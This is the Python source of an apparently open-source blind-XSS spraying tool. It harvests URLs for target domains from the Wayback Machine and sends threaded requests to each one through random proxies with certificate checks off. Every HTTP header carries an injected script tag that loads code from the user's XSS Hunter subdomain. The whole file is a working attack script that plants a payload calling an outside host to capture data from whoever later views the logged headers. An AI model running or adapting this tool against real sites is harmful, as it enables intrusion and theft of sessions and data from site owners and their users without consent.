#!/usr/bin/env python
# By Abdulrahman-Kamel
# Version 1.0

import requests
import argparse
import random
import time
import urllib3
import json
from os import remove
from sys import exit
from scripts import config
from scripts import func as function 

#======================= Start Arguments ==============
parser_arg_menu = argparse.ArgumentParser(prog='tool', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=30))
parser_arg_menu.add_argument("-c",  "--config",   help="set configs tool",  action="store_true")
parser_arg_menu.add_argument("-p",  "--proxies",  help="set proxy to use <file>, ip:port, 'default'", metavar="")
parser_arg_menu.add_argument("-u",  "--urls", 	  help="urls file", metavar="")
parser_arg_menu.add_argument("-d",  "--domain",   help="One domain | will use web-archive site to get urls", metavar="")
parser_arg_menu.add_argument("-ds", "--domains",  help="List domains <file> or seperatot via sign [,] | will use web-archive site to get urls", metavar="")
parser_arg_menu.add_argument("-t",  "--threads",  help="Multiproccess number",metavar="")
parser_arg_menu.add_argument("-T",  "--timeout",  help="timeout number if delay request",  metavar="")
parser_arg_menu.add_argument("-s",  "--sleep", 	  help="sleep after every each request",metavar="")
parser_arg_menu.add_argument("-v",  "--view", 	  help="view status code when send a request",action="store_true")
arg_menu = parser_arg_menu.parse_args()
#======================= Arguments ====================

# class to colors
class colors:
    B = '\033[94m'	 
    b = '\033[96m'   # Blue
    g = '\033[92m'	 # Green
    y = '\033[93m'	 # Yellow
    r = '\033[91m'	 # Red
    e = '\033[0m'	 # End
    #B = '\033[1m' 	 # Bold
    u = '\033[4m' 	 # underLine
    n = '\033[5;91m' # notic

# References variable 
arg_c  = arg_menu.config
arg_p  = arg_menu.proxies
arg_u  = arg_menu.urls
arg_d  = arg_menu.domain
arg_ds = arg_menu.domains
arg_t  = arg_menu.threads
arg_T  = arg_menu.timeout
arg_s  = arg_menu.sleep
arg_v  = arg_menu.view

# arguments filter
max_threads = int(arg_t) if arg_t else int(config.json_threads)
max_timeout = int(arg_T) if arg_T else int(config.json_timeout)

# Additional skip SSL hand check error 
urllib3.disable_warnings()

# remove {error.log , waybackurls.txt}
try: remove('logs/error.log')
except: pass
try: remove('logs/waybackurls.txt')
except: pass

banner =colors.r+"""
           _         _       _           _                             _  __                    _ 
     /\   | |       | |     | |         | |                           | |/ /                   | |
    /  \  | |__   __| |_   _| |_ __ __ _| |__  _ __ ___   __ _ _ __   | ' / __ _ _ __ ___   ___| |
   / /\ \ | '_ \ / _` | | | | | '__/ _` | '_ \| '_ ` _ \ / _` | '_ \  |  < / _` | '_ ` _ \ / _ \ |
  / ____ \| |_) | (_| | |_| | | | | (_| | | | | | | | | | (_| | | | | | . \ (_| | | | | | |  __/ |
 /_/    \_\_.__/ \__,_|\__,_|_|_|  \__,_|_| |_|_| |_| |_|\__,_|_| |_| |_|\_\__,_|_| |_| |_|\___|_|"""+colors.e+'\n\n'+'\t'*4+ 'Github: '+colors.b+ '  github.com/Abdulrahman-Kamel'+colors.e+'\n'+'\t'*4+ 'Linkedin: '+colors.b+ 'linkedin.com/in/abdulrahman-kamel'+colors.e
                                                                                                  
                                                                                                

# print banner in screen
print(banner)

#======================= configration ==============

# download conf/proxies-raw.txt if deleted
function.check_proxiesFile()

# if user enter -c, --config => enter config part
if arg_c:
	config.runing()

# reference to class from function imported
letter = function.letter()

# change headers list to dictionary
HEADERS = letter.list_to_dict(config.json_headers)

# import xsshunter subdomain from configration file
XSSHUNTER = config.json_xsshunter


# if user not enter xsshunter question to get [only in first usage] 
if XSSHUNTER == '-':
	config.xsshunter = input(str(colors.r+'\nYour custom subdomain xsshunter is: '+colors.e))
	config.update()
	print(colors.r+'Can change it via argument:'+colors.e+colors.n+colors.g+' -c, --config'+colors.e+'\n')



# Filter => if user enter -c, --config 'default' set default proxies file
arg_p = function.filter('conf/proxies-raw.txt') if arg_p == 'default' else function.filter(arg_p)
# NOTIC: function.filter() is local function to filter data and make it list

# choose random proxy
randomProxy = random.choices(arg_p,k=1)[0] 	if arg_p != None else None # to skip error 
proxy = {"http": randomProxy, "https": randomProxy}

# change dictionary value => plus xss_hunter payloud
for key, value in HEADERS.items():
    HEADERS[key] = value+'"><script src=https://'+XSSHUNTER+'.xss.ht></script>'


# Function: tool execute
def execute(url):
	try:
		res = requests.get(url, timeout=max_timeout, headers=HEADERS, verify=False, proxies=proxy if arg_p else None)
		if arg_v:
			if str(res.status_code)[0] == '2':
				print(colors.g + str(res.status_code) + '\t' + res.url + colors.e)
			if str(res.status_code)[0] == '3':
				print(colors.B + str(res.status_code) + '\t' + res.url + colors.e)
			if str(res.status_code)[0] == '4':
				print(colors.r + str(res.status_code) + '\t' + res.url + colors.e)
			
			if arg_s:
				time.sleep(int(arg_s)) #sleep


	except Exception as er:
		function.writee('logs/error.log' , 'a+' , 'Error: ('+url+')\t'+str(er)+'\n')
		

if __name__ == '__main__':

	# handle errors from user input
	if not (arg_d or arg_ds or arg_u):
		function.alert('alert_1')
		exit(1)

	elif arg_ds and not ',' in arg_ds:
		function.alert('alert_2')
		exit(1)


	# =========== execute script on specific arguments ===========

	# NOTIC: function.mapThreads() is local function to simple use ThreadPoolExecutor
	# NOTIC: arguments ={threadsNumber, function, file}

	# if user enter xsshunter show this message
	if XSSHUNTER != '-':
		print(colors.B+'\nYour xsshunter is: '+colors.e+colors.g+'https://'+XSSHUNTER+'.xss.ht'+colors.e+colors.B+' Can change it via argument:'+colors.e+colors.n+colors.g+' -c, --config'+colors.e)

	if arg_d or arg_ds:
		if arg_d:
			function.waybackurls(arg_d)

		if arg_ds:
			arg_ds = arg_ds.split(',')
			for domain in arg_ds:
				function.waybackurls(domain)

		print(colors.r+'\nStart runing on ['+ str(function.calc_lines_file('logs/waybackurls.txt'))+'] urls\n'+colors.e)
		
		# execute script on waybackurls.txt file
		function.mapThreads(max_threads, execute, function.lines('logs/waybackurls.txt')) 

	if arg_u:
		print(colors.r+'\nStart runing on ['+ str(function.calc_lines_file(str(arg_u)))+'] urls\n'+colors.e)
		
		# execute script on user input file 
		function.mapThreads(max_threads, execute, function.lines(arg_u))
	# =========== execute script on specific arguments ============
